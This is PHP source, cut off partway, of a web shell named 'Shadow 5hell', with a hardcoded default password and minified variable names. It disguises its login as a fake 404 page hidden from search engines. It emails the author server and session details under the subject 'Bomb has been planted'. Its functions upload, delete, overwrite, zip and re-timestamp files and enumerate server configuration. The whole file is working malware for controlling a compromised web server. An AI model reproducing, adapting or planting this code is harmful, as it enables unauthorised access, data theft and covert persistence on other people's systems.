<?php /**
 * Shadow 5hell
 *
 * Password Default = sponge808
 *
 * @category Seucurity
 *
 * @package Shadow
 *
 * @author Cvar1984 <Cvar1984@protonmail.com>
 *
 * @license WTFPL http://www.wtfpl.net/txt/copying/
 *
 * @link https://github.com/Cvar1984
 */ header('Cache-Control: no cache');session_cache_limiter('private_no_expire');ini_set('display_errors','On');$k0=sys_get_temp_dir();if(is_writable($k0)){ini_set('session.save_path',sys_get_temp_dir());}session_start();$o1=getVariable('password');$z2=$_SERVER['SERVER_ADDR'];$w3=bin2hex($_SERVER["HTTP_HOST"]).$o1;$i4=sha1(getClientIp())?:$o1;function openFile($f5){if(function_exists('file_get_contents')){return file_get_contents($f5);}elseif(function_exists('fopen')){$k6=fopen($f5,'r');if(!$k6){fclose($k6);return false;}$y7=fread($k6,filesize($f5));fclose($k6);return $y7;}}function getOperatingSystem(){$s8=strtolower(substr(PHP_OS,0,5));switch($s8){case 'linux':break;case 'windo':$s8='windows';break;}return $s8;}/**
 * Login function contain html form in it
 *
 * @return void
 */ function getVariable($e9){$v10='Cvar1984@pm.me';if(function_exists('password_verify')){$o1='$2y$10$.WwaTEc/a4WSxMr0GZZypOSqkiwkia.fIlxGEIYM/Yw4a1WKo0H9G';}elseif(function_exists('hash')){$o1='214cc2f40340b23d3c0859fe6d9bda0e588070b20894fc4019245a56f89efc43';}else{$o1='';}switch($e9){case 'email':$n11=$v10;break;case 'password':$n11=$o1;break;}return $n11;}function verifyPassword($a12){$u13=getVariable('password');if(function_exists('password_verify')){return password_verify($a12,$u13);}elseif(function_exists('hash')){return hash('sha256',$a12)===$u13?true:false;}return true;}function login(){global $w3,$i4;if(isset($_POST['pass'])){$g14=$_POST["pass"];$j15='';$_SESSION[$w3]=&$j15;if(verifyPassword($g14)){$j15=$i4;}echo "<script>if(window.history.replaceState){window.history.replaceState(null, null, window.location.href);}location.reload();</script>";}header('HTTP/1.1 404 Not Found');echo '
	<!DOCTYPE HTML>
	<html>
	<head>
	<title>404 Not Found</title>
	<meta name="robots" content="noindex;nofollow" />
	</head>
	<style>
	*{
			box-sizing: border-box;
		}
		body{
			background-color: #474747;
			font-family: "Arial", sans-serif;
			padding: 50px;
		}
		.container{
			border:3px solid #525252;
			margin: 20px auto;
			padding: 10px;
			width: 300px;
			height: 250px;
			background-color: #444444;
			border-radius: 10px;
		}
		 h1{
		 	width: 70%;
			color: #777;
			font-size: 32px;
			margin: 28px auto;
			margin-bottom: 20px;
			text-align: center;
			/*padding-top: 40px;*/
		}
		form{
			/*padding: 15px;*/
			text-align: center;
		}
		input{
			padding: 12px 0;
			margin-bottom: 10px;
			border-radius: 7px;
			border: 2px solid transparent;
			text-align: center;
			width: 90%;
			font-size: 16px;
			transition: border .2s, background-color .2s;
		}
		form .field{
			background-color: #525252;
			color: #777;
		}
		form .field:focus {
			border: 2px solid #3498DB;
			ourline:none;
		}
		form .btn{
			background-color: #4c70a1;
			color: #fff;
			line-height: 25px;
			cursor: pointer;
		}
		form .btn:hover,
		form .btn:active {
			background-color: #1F78B4;
			border: 2px solid #1F78B4;
		}
	</style>
	<body>
	<div class="container">
			<h1>LOGIN</h1>
		<form method="POST">
			<input type="password" name="pass" placeholder="password" class="field">
			<input type="submit" value="login" class="btn">
		</form>
	</div>
	</body>
	</html>';exit;}/**
 *
 * Logout function, destroy and cleanup session
 *
 * @return void
 */ function logout(){session_unset();session_destroy();}function logger($v10){$p16=getClientIp();$v10=getVariable('email');$b17=$_SERVER['HTTP_USER_AGENT'];$i18=$_SERVER['SCRIPT_FILENAME'];$z19=$_COOKIE['PHPSESID'];$f20=$_SERVER['SERVER_ADDR'].$_SERVER['SERVER_PORT'].$_SERVER['REQUEST_URI'];$w21=json_encode([$p16,$b17,$i18,$z19,$f20],JSON_PRETTY_PRINT);if(function_exists('mail')){mail($v10,'Bomb has been planted',$w21);}}/**
 *
 * Get client ip address, return false when client ip can't be found
 *
 * @return string|bool
 */ function getClientIp(){if(isset($_SERVER['HTTP_CLIENT_IP'])){$p22=$_SERVER['HTTP_CLIENT_IP'];}elseif(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){$p22=$_SERVER['HTTP_X_FORWARDED_FOR'];}elseif(isset($_SERVER['HTTP_X_FORWARDED'])){$p22=$_SERVER['HTTP_X_FORWARDED'];}elseif(isset($_SERVER['HTTP_FORWARDED_FOR'])){$p22=$_SERVER['HTTP_FORWARDED_FOR'];}elseif(isset($_SERVER['HTTP_FORWARDED'])){$p22=$_SERVER['HTTP_FORWARDED'];}elseif(isset($_SERVER['REMOTE_ADDR'])){$p22=$_SERVER['REMOTE_ADDR'];}else{$p22=false;}return $p22;}if(!isset($_SESSION[$w3])){login();}if($_SESSION[$w3]!==$i4){login();}function getSelf(){$k23=(isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:"";return html_safe($_SERVER["REQUEST_URI"].$k23);}function html_safe($l24){return htmlspecialchars($l24,2|1);}function setEncodedCookie($w25,$o26){$o26=bin2hex($o26);setcookie($w25,$o26);}function getEncodedCookie($w25){return hex2bin($_COOKIE[$w25]);}function cwd(){$g27=str_replace("\\","/",getcwd());if(!isset($_COOKIE['cwd'])){setEncodedCookie("cwd",$g27);}else{$f28=getEncodedCookie('cwd');if(is_dir($f28)){$g27=realpath($f28);}else{setEncodedCookie("cwd",$g27);}}return $g27;}function getFilemtime($f5){return@date("d-m-Y H:i:s",filemtime($f5));}function getFileSize($k29){$o30=filesize($k29);if($o30>=1073741824){return number_format($o30/1073741824,2).' GB';}elseif($o30>=1048576){return number_format($o30/1048576,2).' MB';}elseif($o30>=1024){return number_format($o30/1024,2).' KB';}elseif($o30>1){return $o30.' bytes';}elseif($o30==1){return '1 byte';}else{return '0 bytes';}}function getOwnership($k29){$s8=getOperatingSystem();$g31=stat($k29);if(!$g31){return false;}switch($s8){case 'linux':$n32=posix_getgrgid($g31[5])['name'];$d33=posix_getpwuid($g31[4])['name'];break;case 'windows':default:$n32=$g31[5];$d33=$g31[4];break;}return @compact('user','group');}function safeMode(){if(@ini_get("safe_mode")){$a34="ON";}else{$a34="OFF";}return $a34;}function serverIP(){return(!@$_SERVER['SERVER_ADDR']?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):"???"):@$_SERVER['SERVER_ADDR']);}function getColor($f35=1,$v36=null,$p37=null){$m38=array("</span>","<span style=\"color:lime;\">","<span style=\"color:#fa5a5a;\">","<span style=\"color:#fff;\">",);return($p37!==null)?$m38[$v36].$p37.$m38[0]:$m38[$v36];}function disableFuntions(){$u39=@ini_get("disable_functions");$u39=(!empty($u39))?$u39:"NONE";return $u39;}function libInstalled(){$w40[]="Mysql : ".(function_exists("mysql_connect")?"ON":"OFF");$w40[]="cURL : ".(function_exists("curl_version")?"ON":"OFF");$w40[]="SSH : ".(function_exists("ssh2_connect")?"ON":"OFF");return implode(" | ",$w40);}function serverInfo(){$k41[]="Uname : ".php_uname();$k41[]="Web Server : ".$_SERVER['SERVER_SOFTWARE'];$k41[]="PHP Version : ".phpversion()." Safe Mode: ".safeMode();$k41[]="Server IP : ".serverIP()." Your IP : ".@$_SERVER['REMOTE_ADDR'];$k41[]="Date Time : ".@date('m-d-Y H:i:s');$k41[]="Disable Functions : ".disableFuntions();$k41[]=libInstalled();return implode("<br>",$k41);}function fileInfo($k29){$v42[]="<tr><td style=\"width:100px;\">Filename</td><td style=\"width:10px;\">:</td> <td>".basename($k29);$v42[]="<tr><td>Size</td><td>:</td> <td>".getFileSize($k29);$v42[]="<tr><td>Permissions</td><td>:</td> <td>".getPermission($k29);$v42[]="<tr><td>Last Modify</td><td>:</td> <td>".getFilemtime($k29);return implode("</td></tr>",$v42);}function viewFileInfo($k29){$v42=fileInfo($k29);echo"
	<div class=\"core\">
		<div class=\"core-filename\">{$v42[0]}</div>
	</div>";}function getPermission($k29){$s43=fileperms($k29);return substr(sprintf('%o',$s43),-4);}function wr($k29,$p44){if(file_exists($k29)){return(is_writable($k29))?"<span style=\"color:#38a312;\">{$p44}</span>":"<font color='#fa5a5a'>{$p44}</font>";}}function mySelf($k29){return($k29==basename(__FILE__))?"<b><span class=\"button button_danger\">".basename(__FILE__)."</span></b>":$k29;}function getExtension($k29){return strtolower(pathinfo($k29,PATHINFO_EXTENSION));}function alert($z45,$g46){?>
	<style type="text/css">
		#snackbar {
			word-wrap: break-word;
		}

		#toast-container {
			visibility: hidden;
			position: fixed;
			z-index: 999999;
			-webkit-animation: fadein 0.5s, fadeout 0.5s 2.5s;
			animation: fadein 0.5s, fadeout 0.5s 2.5s;
		}

		#toast-container.show {
			visibility: visible;
		}

		#toast-container * {
			-moz-box-sizing: border-box;
			-webkit-box-sizing: border-box;
			box-sizing: border-box;
		}
		.toast-top-right {
			top: 80px;
			right: 38px;
		}

		#toast-container > div {
			position: relative;
			pointer-events: auto;
			overflow: hidden;
			margin: 0 0 6px;
			padding: 20px 25px;
			min-width: 300px;
			-moz-border-radius: 3px 3px 3px 3px;
			-webkit-border-radius: 3px 3px 3px 3px;
			border-radius: 5px;
			background-repeat: no-repeat;
			color: #ffffff;
			opacity: 0.8;
			-ms-filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=80);
			filter: alpha(opacity=80);
		}

		.toast {
			background-color: #030303;
		}

		.toast-success {
			background-color: #51a351;
		}

		.toast-error {
			background-color: #bd362f;
		}

		@-webkit-keyframes fadein {
			from {
				bottom: 0;
				opacity: 0;
			}
			to {
				bottom: 30px;
				opacity: 1;
			}
		}

		@keyframes fadein {
			from {
				bottom: 0;
				opacity: 0;
			}
			to {
				bottom: 30px;
				opacity: 1;
			}
		}

		@-webkit-keyframes fadeout {
			from {
				bottom: 30px;
				opacity: 1;
			}
			to {
				bottom: 0;
				opacity: 0;
			}
		}

		@keyframes fadeout {
			from {
				bottom: 30px;
				opacity: 1;
			}
			to {
				bottom: 0;
				opacity: 0;
			}
		}

	</style>
	<div id="toast-container" class="toast-top-right">
		<div id="toast-type" class="toast" aria-live="assertive" style="">
			<div id="snackbar">message</div>
		</div>
	</div>
	<?php echo '<script type="text/javascript">
		let animating = false;
		function Toast(message, messagetype) {
			var cont = document.getElementById("toast-container");
			cont.classList.add("show");
			var type = document.getElementById("toast-type");
			type.className += " " + messagetype;
			var x = document.getElementById("snackbar");
			x.innerHTML = message;
			setTimeout(function() {
				cont.classList.remove("show");
				animating = false;
			}, 3000);
		}

		Toast("'.$z45.'", "toast-'.$g46.'");
	</script>';}function getIcon($k29){if(is_dir($k29)){return "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAAXNSR0IArs4c6QAAARRJREFUOE+tz7FKA0EQBuCZjRd31tuZOwmCIEYfIZWFT2AbxHfwZax9hyDYWliLjfoEeoIgiCAERJDsTcjFxkKzxWyzMPvPN7MIxgebyehIQQ/+dNHd7B/fXeXOxeZi9AQAe/81IOrJcPwwyUEXoGYFM9FscNVQh3C6O74/70DyBUj0CoAJARIgJFVoEWEGsLxVsV3UETABaOsQZ22X0eS6GiTn8LIDJRJUTKuWyHrvwCqGJOx7WR0rQkuQ6Vsi9S3BL4lk8uefDcOnRL9ht2GkqTCxGVgLfXBJtSEY3rn0AzOw4vAm0W+ZgTWHV45+2wzcFHqJJe2YgbWEZy790ABscHp9eLZerA36Re/RALxFA+QXMQefKmk623YTygAAAABJRU5ErkJggg==";}else{return "https://cdn-icons-png.flaticon.com/512/342/342348.png";}}function writeFile($k29,$y7){if($d47=@fopen($k29,"wb")){if(fwrite($d47,$y7)!==false){return true;}}}function multiMakingFiles($k29,$g46){foreach($k29 as $o48=>$f49){switch($g46){case 'file':return touch($f49);break;case 'folder':return mkdir($f49);break;}}}function uploadFile($i18){if(isset($_FILES['file'])){$f5=$_FILES['file'];$h50=count($f5['name']);for($o51=0;$o51<$h50;$o51++){$r52=$f5['tmp_name'][$o51];$z53=$i18."/".$f5['name'][$o51];if(@move_uploaded_file($r52,$z53)){echo alert(count($f5['name'])." files uploaded","success");}else{echo alert("failed upload","error");}}}}function zip($g54,$z53){if(extension_loaded('zip')){if(file_exists($g54)){$l55=new ZipArchive();if($l55->open($z53,ZIPARCHIVE::CREATE)){if(is_dir($g54)){$k56=new RecursiveDirectoryIterator($g54);$k56->setFlags(RecursiveDirectoryIterator::SKIP_DOTS);$x57=new RecursiveIteratorIterator($k56,RecursiveIteratorIterator::SELF_FIRST);foreach($x57 as $f5){$e58=$_SERVER['DOCUMENT_ROOT'];if(is_dir($f5)){$l55->addEmptyDir(str_replace($e58,'',$f5.'/'));}else if(is_file($f5)){$l55->addFromString(str_replace($e58,'',$f5),file_get_contents($f5));}}}else if(is_file($g54)){$l55->addFromString(basename($g54),file_get_contents($g54));}}return $l55->close();}}return false;}function unzip($f5,$z53){if(!class_exists('ZipArchive')){return false;}$l55=new ZipArchive;$j59=$l55->open($f5);if(!$j59===true){return false;}$l55->extractTo($z53);$l55->close();return true;}function changeDateaTime($k29,$f60){return touch($k29,@strtotime($f60));}function getExtImage($k29){return(@exif_imagetype($k29))?"disabled=\"disabled\"":null;}function delete($k29){if(is_dir($k29)){foreach(scandir($k29)as $o48=>$f49){if($f49!="."&&$f49!=".."){if(is_dir($k29.DIRECTORY_SEPARATOR.$f49)){delete($k29.DIRECTORY_SEPARATOR.$f49);}else{unlink($k29.DIRECTORY_SEPARATOR.$f49);}}}if(@rmdir($k29)){return true;}else{return false;}}else{if(unlink($k29)){return true;}else{return false;}}}if(!function_exists("listFiles")){function listFiles($g27,$g46){if(!is_dir($g27)||!is_readable($g27)){return false;}$y61=[];foreach(scandir($g27)as $o48=>$f49){$f5["path"]=$g27.DIRECTORY_SEPARATOR.$f49;$f5=[$f5["path"],$f49];switch($g46){case "all":if(is_dir($f5[0])||$f5[1]==="."||$f5[1]===".."){$y61[]=$f5;continue 2;}break;case "dir":if(!is_dir($f5[0])||$f5[1]==="."||$f5[1]==="..")continue 2;break;case "file":if(!is_file($f5[0]))continue 2;break;}$y61[]=$f5;}return $y61;}}ob_start();?>
<!DOCTYPE html>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
<style type="text/css">
	@import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300&display=swap');

	body {
		font-family: 'Ubuntu', sans-serif;
		background-color: #474747;
	}

	td {
		padding: .4rem 1rem;
	}

	td.td-icon {
		width:5%;
		text-align: center;
	}

	td.td-files {
		border-right: 3px solid #444;
		
	}

	div.sortname {
        display: inline-block;
        max-width:480px;
        overflow: hidden;
        white-space: nowrap;
        text-overflow: ellipsis;
	}

	td.td-size {
		border-right: 3px solid #444;
		width:150px;
		text-align: center;
	}

	td.td-permission {
		border-right: 3px solid #444;
		width:100px;
		text-align: center;
	}

	td.td-owner {
		border-right: 3px solid #444;
		min-width:150px;
		max-width:auto;
		text-align: center;
	}

	td.td-last {
		border-right: 3px solid #444;
		width:200px;
		text-align: center;
	}

	td.td-action {
		width:200px;
		text-align: center;
	}

	table {
		border-spacing:0;
	}

	table.editPage {
		padding: 20px;
		background-color: #474747;
		height:200px;
	}

	input.checkbox {
		margin-bottom: -20px;
		display: block;
	}

	input[type=text] {
		background-color: #5e5e5e;
		color: #c4c4c4;
		border-radius:7px;
		padding: 10px;
	}

	input[type=text]:focus {
		outline: 3px solid #fa5a5a;
	}

	tbody tr {
		background-color: #474747;
		color: #c4c4c4;
	}

	th {
		background: #444;
		color: #fff;
		text-align:left;
		padding: .8rem 1rem;
	}

	th.head {
		background-color: #474747;
		text-align: center;
		padding: 20px;
	}

	.pwd {
		padding: 20px;
		background-color: #474747;
		font-weight: normal;
		font-size: 20px;
	}

	textarea {
		background-color: #5e5e5e;
		border: none;
		resize: none;
		width:100%;
		height:400px;
		color: #c4c4c4;
		border-radius: 10px;
		padding: 20px;
	}

	textarea:focus {
		outline: 3px solid #fa5a5a;
	}

	a {
		text-decoration: none;
		color: #c4c4c4;
	}

	a[disabled="disabled"] {
        pointer-events: none;
    }

	.hover:hover {
		background: #444;
	}

	.pagination {
		background-color: #4444;
		padding: 1rem;
		margin-bottom: 1rem;
		text-align: center;
		display: flex;
		justify-content: center;
	}

	#numbers {
		padding: 0;
		margin: 0 2rem;
		list-style-type: none;
		display: flex;
	}

	#numbers li a {
		color: #fff;
		border-radius: 5px;
		padding: .4rem 1rem;
		text-decoration: none;
		opacity: .7;
	}

	#numbers li a:hover {
		opacity: 1;
	}

	#numbers li a.active {
		opacity: 1;
		background: #fff;
		color: #333;
	}

	.button {
		display: inline-block;
		margin: 0;
		padding: 0.10rem 0.5rem;
		border: 0;
		border-radius: 0.317rem;
		background-color: #aaa;
		color: #fff;
		text-decoration: none;
		font-weight: 500;
		font-size: 1rem;
		line-height: 1.5;
		font-family: "Helvetica Neue", Arial, sans-serif;
		cursor: pointer;
		-webkit-appearance: none;
		-webkit-font-smoothing: antialiased;
	}

	.button:hover {
		opacity: 0.85;
	}

	.button:active {
		box-shadow: inset 0 3px 4px hsla(0, 0%, 0%, 0.2);
	}

	.button:focus {
		outline: thin dotted #444;
		outline: 5px auto -webkit-focus-ring-color;
		outline-offset: -2px;
	}

	.button_primary {
		background-color: #1fa3ec;
	}

	.button_danger {
		background-color: #fa5a5a;
	}

	.button_secondary {
		background-color: #e98724;
	}

	.button_warning {
		background-color: #c7a32c;
	}

	.button-icon {
		display: inline-block;
		position: relative;
		top: -0.1em;
		vertical-align: middle;
		margin-right: 0.317rem;
	}

	img.icon {
		width:25px;
		height: 25px;
		margin-left: 20px;
		display: block;
	}
	* {
		border: 0;
		box-sizing: border-box;
		margin: 0;
		padding: 0;
	}

	a {
		color: inherit;
		font-family: inherit;
		font-size: inherit;
		text-decoration: none;
	}

	.cp {
		text-align: center;
		color: #c4c4c4;
		padding-bottom: 20px;
	}

	.cp a {
		color: #e98724;
	}

	.serverInfo {
		padding-left: 15px;
		color: #c4c4c4;
	}

	#navbar {
		background: #444;
		color: #fff;
		position: fixed;
		top: 0;
		height: 60px;
		line-height: 60px;
		width: 100vw;
		z-index: 10;
	}

	.nav-wrapper {
		margin: auto;
		text-align: center;
		width: 70%;
	} @media(max-width: 768px) {
		.nav-wrapper {
			width: 90%;
		}
	} @media(max-width: 638px) {
		.nav-wrapper {
			width: 100%;
		}
	}


	.logo {
		float: left;
		margin-left: -208px;
		font-size: 1.5em;
		height: 50px;
		letter-spacing: 1px;
		text-transform: uppercase;
	} @media(max-width: 768px) {
		.logo {
			margin-left: 28px;
		}
	}

	#navbar ul {
		display: inline-block;
		float: right;
		list-style: none;
		margin-top: -2px;
		text-align: right;
		transition: transform 0.5s ease-out;
		-webkit-transition: transform 0.5s ease-out;
	} @media(max-width: 640px) {
		#navbar ul {
			display: none;
		}
	} @media(orientation: landscape) {
		#navbar ul {
			display: inline-block;
		}
	}

	#navbar li {
		display: inline-block;
	}

	#navbar li a {
		color: #fff;
		display: block;
		font-size: 1em;
		height: 50px;
		letter-spacing: 1px;
		margin: 0 20px;
		padding: 0 4px;
		position: relative;
		text-decoration: none;
		text-transform: uppercase;
		transition: all 0.5s ease;
		-webkit-transition: all 0.5s ease;
	}

	#navbar li a:hover {
		color: rgb(28, 121, 184);
		transition: all 1s ease;
		-webkit-transition: all 1s ease;
	}

	#navbar li a:before, #navbar li a:after {
		content: '';
		position: absolute;
		width: 0%;
		height: 1px;
		bottom: -1px;
		background: rgb(13, 26, 38);
	}

	#navbar li a:before {
		left: 0;
		transition: 0.5s;
	}

	#navbar li a:after {
		background: rgb(13, 26, 38);
		right: 0;
	}

	#navbar li a:hover:before {
		background: rgb(13, 26, 38);
		width: 100%;
		transition: width 0.5s cubic-bezier((0.22, 0.61, 0.36, 1));
	}

	#navbar li a:hover:after {
		background: transparent;
		width: 100%;
	}

	@media(max-width: 640px) {
		.menuIcon {
			cursor: pointer;
			display: block;
			position: fixed;
			right: 15px;
			top: 20px;
			height: 23px;
			width: 27px;
			z-index: 12;
		}

		.icon-bars {
			background: rgb(13, 26, 38);
			position: absolute;
			left: 1px;
			top: 45%;
			height: 2px;
			width: 20px;
			-webkit-transition: 0.4s;
			transition: 0.4s;
		}

		.icon-bars::before {
			background: rgb(13, 26, 38);
			content: '';
			position: absolute;
			left: 0;
			top: -8px;
			height: 2px;
			width: 20px;
			-webkit-transition: 0.3s width 0.4s;
			transition: 0.3s width 0.4s;
		}

		.icon-bars::after {
			margin-top: 0px;
			background: rgb(13, 26, 38);
			content: '';
			position: absolute;
			left: 0;
			bottom: -8px;
			height: 2px;
			width: 20px;
			-webkit-transition: 0.3s width 0.4s;
			transition: 0.3s width 0.4s;
		}

		.icon-bars.overlay {
			background: rgb(97, 114, 129);
			background: rgb(183, 199, 211);
			width: 20px;
			animation: middleBar 3s infinite 0.5s;
			-webkit-animation: middleBar 3s infinite 0.5s;
		} @keyframes middleBar {
			0% {width: 0px}
			50% {width: 20px}
			100% {width: 0px}
		} @-webkit-keyframes middleBar {
			0% {width: 0px}
			50% {width: 20px}
			100% {width: 0px}
		}

		.icon-bars.overlay::before {
			background: rgb(97, 114, 129);
			background: rgb(183, 199, 211);
			width: 10px;
			animation: topBar 3s infinite 0.2s;
			-webkit-animation: topBar 3s infinite 0s;
		} @keyframes topBar {
			0% {width: 0px}
			50% {width: 10px}
			100% {width: 0px}
		} @-webkit-keyframes topBar {
			0% {width: 0px}
			50% {width: 10px}
			100% {width: 0px}
		}

		.icon-bars.overlay::after {
			background: rgb(97, 114, 129);
			background: rgb(183, 199, 211);
			width: 15px;
			animation: bottomBar 3s infinite 1s;
			-webkit-animation: bottomBar 3s infinite 1s;
		} @keyframes bottomBar {
			0% {width: 0px}
			50% {width: 15px}
			100% {width: 0px}
		} @-webkit-keyframes bottomBar {
			0% {width: 0px}
			50% {width: 15px}
			100% {width: 0px}
		}

		.menuIcon.toggle .icon-bars {
			top: 5px;
			transform: translate3d(0, 5px, 0) rotate(135deg);
			transition-delay: 0.1s;
			transition: transform 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
		}

		.menuIcon.toggle .icon-bars::before {
			top: 0;
			transition-delay: 0.1s;
			opacity: 0;
		}

		.menuIcon.toggle .icon-bars::after {
			top: 10px;
			transform: translate3d(0, -10px, 0) rotate(-270deg);
			transition-delay: 0.1s;
			transition: transform 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
		}

		.menuIcon.toggle .icon-bars.overlay {
			width: 20px;
			opacity: 0;
			-webkit-transition: all 0s ease 0s;
			transition: all 0s ease 0s;
		}
	}
	.overlay-menu {
		background: lightblue;
		color: rgb(13, 26, 38);
		display: flex;
		align-items: center;
		justify-content: center;
		position: absolute;
		top: 0;
		right: 0;
		padding-right: 15px;
		transform: translateX(-100%);
		width: 100vw;
		height: 100vh;
		-webkit-transition: transform 0.2s ease-out;
		transition: transform 0.2s ease-out;
	}

	.overlay-menu ul, .overlay-menu li {
		display: block;
		position: relative;
	}

	.overlay-menu li a {
		display: block;
		font-size: 1.8em;
		letter-spacing: 4px;
		padding: 10px 0;
		text-align: right;
		text-transform: uppercase;
		-webkit-transition: color 0.3s ease;
		transition: color 0.3s ease;
	}

	.overlay-menu li a:hover,
	.overlay-menu li a:active {
		color: rgb(28, 121, 184);
		-webkit-transition: color 0.3s ease;
		transition: color 0.3s ease;
	}

	.drop-down{
		display: inline-block;
		margin-left: 750px;
		position: relative;
		width: 150px;
	}

	.drop-down__button{

		display: inline-block;
		line-height: 40px;
		padding: 0 18px;
		text-align: left;
		border-radius: 4px;
		cursor: pointer;
	}

	.drop-down__name {
		font-size: 1em;
		text-transform: uppercase;
		color: #fff;

		letter-spacing: 2px;
	}

	.drop-down__icon {
		width: 18px;
		vertical-align: middle;
		margin-left: 14px;
		height: 18px;
		border-radius: 50%;
		transition: all 0.4s;
		-webkit-transition: all 0.4s;
		-moz-transition: all 0.4s;
		-ms-transition: all 0.4s;
		-o-transition: all 0.4s;

	}



	.drop-down__menu-box {
		position: absolute;
		width: 100%;
		left: 0;
		background-color: #fff;
		border-radius: 4px;
		visibility: hidden;
		opacity: 0;
		margin-top: 5px;
	}

	.drop-down__menu {
		margin: 0;
		text-align: left;
		padding: 0 13px;
		list-style: none;

	}
	.drop-down__menu-box:before{
		content:'';
		background-color: transparent;
		border-right: 8px solid transparent;
		position: absolute;
		border-left: 8px solid transparent;
		border-bottom: 8px solid #fff;
		border-top: 8px solid transparent;
		top: -15px;
		right: 18px;

	}

	.drop-down__menu-box:after{
		content:'';
		background-color: transparent;
	}

	.drop-down__item {
		font-size: 13px;
		padding: 13px 0;
		text-align: left;
		font-weight: 500;
		color: #909dc2;
		cursor: pointer;
		position: relative;
		border-bottom: 1px solid #e0e2e9;
	}

	.drop-down__item-icon {
		width: 15px;
		height: 15px;
		position: absolute;
		right: 0px;
		fill: #8995b6;

	}

	.drop-down__item:hover .drop-down__item-icon{
		fill: #3d6def;
	}

	.drop-down__item:hover{
		color: #3d6def;
	}



	.drop-down__item:last-of-type{
		border-bottom: 0;
	}


	.drop-down--active .drop-down__menu-box{
		visibility: visible;
		opacity: 1;
		margin-top: 15px;
	}

	.drop-down__item:before{
		content:'';
		position: absolute;
		width: 3px;
		height: 28px;
		background-color: #3d6def;
		left: -13px;
		top: 50%;
		transform: translateY(-50%);
		display:none;
	}

	.drop-down__item:hover:before{
		display:block;
	}


	section {}
	ul {
		margin: 0;
		padding: 0;
		list-style: none;
	}
	.contact-area {
		border-bottom: 1px solid #353C46;
	}

	.contact-content p::after {
		background: #353C46;
		bottom: -30px;
		content: "";
		height: 1px;
		left: 50%;
		position: absolute;
		transform: translate(-50%);
		width: 80%;
	}

	.contact-social {
		padding: 20px;
	}

	.contact-social > ul {
		display: inline-flex;
	}

	.contact-social ul li a {
		border: 1px solid #8b9199;
		color: #8b9199;
		display: inline-block;
		height: 40px;
		margin: 0 10px;
		padding-top: 7px;
		transition: all 0.4s ease 0s;
		width: 40px;
	}

	.contact-social ul li a:hover {
		border: 1px solid #FAB702;
		color: #FAB702;
	}

	.makeFile {
		
		background-color: #474747;
		padding: 15px;
		border-radius:10px;
		justify-content: center;
		text-align: center;
		margin-right: 10px;
	}

	.makeCenter {
		margin-top: 10px;
	}

	.makeCenter input[type=file] {
		background-color: #5e5e5e;
		margin-top: 5px;
		width: 100%;
		padding:8px;
		border-radius: 7px;
	}

	.makeCenter input[type=text] {
		margin-top: 5px;
		width: 100%;
		padding:10px;
		border-radius: 7px;
	}

	.makeCenter input[type=submit] {
		margin-top: 5px;
		width: 100%;
		padding:5px;
		border-radius: 7px;
	}

	.contact-content img {
		max-width: 210px;
	}

	section, footer {
		background: #444;
		color: #868c96;
	}

	footer p {
		padding: 40px 0;
		text-align: center;
	}

	footer img {
		width: 44px;
	}

	.divSelect {
		background-color: #444;
		padding: 15px;
	}
	.divSelect select {
		background-color: #5e5e5e;
		color: #c4c4c4;
		border-radius:7px;
		padding: 10px;
	}

	.divSelect select:focus {
		outline: 3px solid #fa5a5a;
	}
</style>
<script type="text/javascript">
if (window.history.replaceState) {
	window.history.replaceState(null, null, window.location.href);
}


</script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.js"></script>
<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<body>
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<nav id="navbar" class="">
	<div class="nav-wrapper">
		<div class="logo">
			<a onclick="set_cookie('cwd', '');" href="http://<?=$_SERVER['HTTP_HOST'].getSelf()?>"><i class="fa fa-optin-monster"></i> 5hell minerva</a>
		</div>
       <div class="drop-down">
         <div id="dropDown" class="drop-down__button">
           <span class="drop-down__name">Tools</span>
         </div>

         <div class="drop-down__menu-box">
           <ul class="drop-down__menu">
             <li data-name="profile" class="drop-down__item">Your Profile</li>
             <li data-name="dashboard" class="drop-down__item">Your Dashboard</li>
             <li data-name="activity" class="drop-down__item">Recent activity</li>
           </ul>
         </div>
       </div>
		<ul id="menu">
			<li><a href="javascript:action('', 'logout');"><span style="color:#fa5a5a;">Logout</span></a></li>
		</ul>
	</div>
</nav>
<div class="menuIcon">
	<span class="icon icon-bars"></span>
	<span class="icon icon-bars overlay"></span>
</div>


<div class="overlay-menu">
	<ul id="menu">
		<li><a href="">Upload</a></li>
		<li><a href="">Config</a></li>
		<li><a href="">Sql manager</a></li>
		<li><a href="javascript:action('', 'logout');"><span style="color:#fa5a5a;">Logout</span></a></li>
	</ul>
</div>
<br><br><br>
<?php function viewFiles($i18){echo "<form action=\"\" method=\"post\" id=\"5hell\">";echo "<table class=\"\" width=\"100%\" id=\"my-table\" />";echo "<thead>
			<tr>
				<th colspan=\"7\">
				<div class=\"serverInfo\">
